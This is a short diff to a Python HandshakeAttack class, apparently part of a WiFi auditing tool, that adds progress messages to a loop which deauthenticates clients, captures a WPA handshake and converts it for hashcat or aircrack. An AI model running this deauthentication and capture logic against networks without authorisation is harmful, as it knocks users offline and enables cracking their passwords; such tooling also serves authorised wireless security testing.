@@ -37,9 +37,13 @@ class HandshakeAttack(Attack):
         ])
 
         captured = False
+        rounds = 0
         try:
             deadline = time.time() + HANDSHAKE_CAPTURE_TIME
             while time.time() < deadline:
+                rounds += 1
+                who = f"{len(net.clients)} client(s)" if net.clients else "broadcast"
+                ctx.status(f"deauth round {rounds} ({who}) · waiting for handshake…")
                 self._deauth(runner, iface, net)
                 if ctx.dry_run:
                     captured = True
@@ -58,6 +62,7 @@ class HandshakeAttack(Attack):
                                 message="No handshake captured")
 
         # Convert to 22000 (for hashcat); otherwise fall back to .cap + aircrack
+        ctx.status("handshake captured · preparing hash…")
         hashfile = prefix + ".22000"
         if runner.has("hcxpcapngtool") or ctx.dry_run:
             runner.run(["hcxpcapngtool", "-o", hashfile, cap], timeout=60)
